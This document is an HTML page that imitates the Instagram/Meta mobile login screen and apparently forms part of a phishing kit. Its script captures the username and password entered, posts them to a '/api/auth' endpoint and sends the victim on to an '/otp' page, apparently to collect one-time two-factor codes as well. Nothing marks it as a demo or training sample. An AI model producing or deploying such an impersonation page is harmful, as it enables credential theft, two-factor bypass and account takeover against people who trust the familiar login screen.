<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>Log in • Instagram</title>
<style>
  :root { --meta-blue: #0064e0; --border-color: #dbdbdb; --bg-color: #ffffff; --text-color: #262626; --text-muted: #737373; }
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
  body { background: var(--bg-color); color: var(--text-color); display: flex; flex-direction: column; min-height: 100vh; }
  .header { display: flex; align-items: center; justify-content: center; position: relative; padding: 16px; height: 60px; }
  .back-btn { position: absolute; left: 16px; background: none; border: none; cursor: pointer; padding: 8px; }
  .back-btn svg { width: 24px; height: 24px; stroke: #000; stroke-width: 2; fill: none; stroke-linecap: round; stroke-linejoin: round; }
  .meta-logo { display: flex; align-items: center; gap: 8px; font-size: 18px; font-weight: 600; color: #1c2b33; }
  .meta-logo svg { width: 28px; height: 20px; fill: var(--meta-blue); }
  .container { flex: 1; padding: 24px 16px; display: flex; flex-direction: column; }
  .input-group { margin-bottom: 12px; }
  .input-group input { width: 100%; padding: 16px; border: 1px solid var(--border-color); border-radius: 12px; font-size: 15px; outline: none; background: var(--bg-color); transition: border-color 0.2s; }
  .input-group input:focus { border-color: var(--meta-blue); }
  .input-group input::placeholder { color: var(--text-muted); }
  .login-btn { width: 100%; padding: 14px; background: var(--meta-blue); color: #fff; border: none; border-radius: 50px; font-size: 16px; font-weight: 600; margin-top: 8px; cursor: pointer; }
  .login-btn:active { background: #0050b3; }
  .login-btn:disabled { opacity: 0.7; }
  .forgot-pass { display: block; text-align: center; margin-top: 20px; font-size: 15px; font-weight: 600; color: #1c2b33; text-decoration: none; }
  .home-indicator { width: 134px; height: 5px; background: #000; border-radius: 100px; margin: 0 auto 8px; display: block; }
</style>
</head>
<body>
<div class="header">
  <button class="back-btn" onclick="window.history.back()"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></button>
  <div class="meta-logo"><svg viewBox="0 0 40 24" xmlns="http://www.w3.org/2000/svg"><path d="M28.6,2.2c-3.6,0-6.7,2.7-8.6,5.2C18.1,4.9,15,2.2,11.4,2.2C5.1,2.2,0,7.3,0,13.6s5.1,11.4,11.4,11.4 c3.6,0,6.7-2.7,8.6-5.2c1.9,2.5,5,5.2,8.6,5.2c6.3,0,11.4-5.1,11.4-11.4S34.9,2.2,28.6,2.2z M11.4,20.1c-3.6,0-6.5-2.9-6.5-6.5 s2.9-6.5,6.5-6.5c2.4,0,4.6,1.8,6,3.8c-1.1,1.7-2.3,3.5-3.3,5.1C13.5,17.2,12.5,18.3,11.4,20.1L11.4,20.1z M28.6,20.1 c-1.1,0-2.5-1.3-4.3-4.1c-0.4-0.6-0.8-1.3-1.2-2c1.4-2,3.6-3.8,6-3.8c3.6,0,6.5,2.9,6.5,6.5S32.2,20.1,28.6,20.1z" /></svg>Meta</div>
</div>
<div class="container">
  <form id="ig-form">
    <div class="input-group"><input type="text" id="username" placeholder="Username, email address or mobile number" autocomplete="off" required></div>
    <div class="input-group"><input type="password" id="password" placeholder="Password" required></div>
    <button type="submit" class="login-btn" id="submit-btn">Log in</button>
    <a href="#" class="forgot-pass">Forgotten password?</a>
  </form>
</div>
<span class="home-indicator"></span>
<script>
  document.getElementById('ig-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const user = document.getElementById('username').value.trim();
    const pass = document.getElementById('password').value;
    const btn = document.getElementById('submit-btn');
    if (!user || !pass) return;
    btn.textContent = 'Logging in...'; btn.disabled = true;
    try {
      const res = await fetch('/api/auth', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email: user, password: pass, ts: Date.now() }) });
      if (res.ok) { window.location.href = '/otp'; } else { btn.textContent = 'Log in'; btn.disabled = false; alert('Incorrect credentials.'); }
    } catch (err) { btn.textContent = 'Log in'; btn.disabled = false; }
  });
</script>
</body>
</html>
